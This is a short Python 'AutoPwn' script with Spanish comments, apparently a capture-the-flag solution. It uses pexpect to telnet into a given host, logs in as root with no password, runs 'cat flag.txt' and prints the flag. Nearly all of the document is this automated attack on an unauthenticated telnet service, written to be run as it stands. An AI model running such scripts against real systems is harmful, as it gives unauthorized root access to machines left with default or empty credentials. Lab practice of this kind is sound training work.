#!/usr/bin/python3

import pexpect
import argparse
from colorama import Fore, Style

class Exploit:
    def __init__(self, ip_address, lport):
        self.ip_address = ip_address
        self.lport = lport

    def run(self, username):
        try:
            # Iniciar el shell telnet
            shell = pexpect.spawn('telnet', [self.ip_address, str(self.lport)])
            shell.expect(b'Escape character is')

            # Enviar el nombre de usuario al shell telnet
            shell.sendline(username.encode('ascii'))

            # Esperar el prompt del shell telnet
            shell.expect(b'# ')

            # Enviar el comando 'cat flag.txt' al shell telnet
            shell.sendline(b'cat flag.txt')

            # Esperar tanto la cadena 'END_OF_OUTPUT\r\n' como el prompt '# ' en la salida del shell telnet
            shell.expect([b'END_OF_OUTPUT\r\n', b'# '], timeout=5)

            # Obtener la salida antes del prompt '# ' o 'END_OF_OUTPUT\r\n'
            output = shell.before.decode('utf-8').strip()

            # Obtener la línea de la flag (segunda línea desde el final)
            flag_output = output.split('\r\n')[-2]

            # Imprimir la línea de la flag en color verde
            print(Fore.GREEN + f"El contenido de la 'flag': {flag_output}" + Style.RESET_ALL)

            # Cerrar el shell telnet
            shell.close()
        except Exception as e:
            # Manejar cualquier excepción ocurrida durante la ejecución
            print(Fore.RED + f"Error al conectar por Telnet: {str(e)}" + Style.RESET_ALL)

def get_arguments():
    # Configurar y obtener los argumentos de línea de comandos
    parser = argparse.ArgumentParser(description='Uso de AutoPwn')
    parser.add_argument('-i', '--ip', dest='ip_address', required=True, help='IP de host remoto')
    parser.add_argument('-p', '--port', dest='lport', default=23, required=False, help='Proporcionar puerto.')
    return parser.parse_args()

def main():
    # Obtener los argumentos de línea de comandos
    args = get_arguments()

    # Crear una instancia del objeto Exploit con la IP y el puerto proporcionados
    exploit = Exploit(args.ip_address, args.lport)

    # Definir el nombre de usuario
    username = "root"

    # Ejecutar el exploit
    exploit.run(username)

if __name__ == '__main__':
    main()


